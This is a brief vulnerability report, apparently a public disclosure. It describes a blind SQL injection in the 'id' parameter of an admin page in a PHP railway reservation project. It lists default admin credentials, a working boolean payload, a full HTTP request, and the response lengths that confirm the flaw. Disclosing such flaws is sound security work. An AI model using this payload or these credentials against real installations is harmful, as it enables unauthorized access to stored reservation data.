# Online Railway Reservation System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html

Vulnerability File: /orrs/admin/reservations/view_details.php?id=

Vulnerability location: /orrs/admin/reservations/view_details.php?id=, id

Current database name: orrs_db,length is 7

[+] Payload: /orrs/admin/reservations/view_details.php?id=8%20and%20length(database())=7 // Leak place ---> id

```sql
GET /orrs/admin/reservations/view_details.php?id=8%20and%20length(database())=7 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hea24clorqs9kplqalqihp0ik4
Connection: close
```

When length (database ()) = 6, Content-Length: 1943
![image](https://user-images.githubusercontent.com/54017627/172331373-da327434-cd5e-4896-8c9d-a11f8cf7c18d.png)

![image](https://user-images.githubusercontent.com/54017627/172331945-cf2967aa-d15a-445c-8c4a-4330fb13e1ed.png)

When length (database ()) = 7, Content-Length: 4116
![image](https://user-images.githubusercontent.com/54017627/172331320-6f27b419-a1b5-4d9f-b8b5-463be4103ead.png)

![image](https://user-images.githubusercontent.com/54017627/172331871-f98a1ea0-a013-41fd-88a6-1cad786451a1.png)
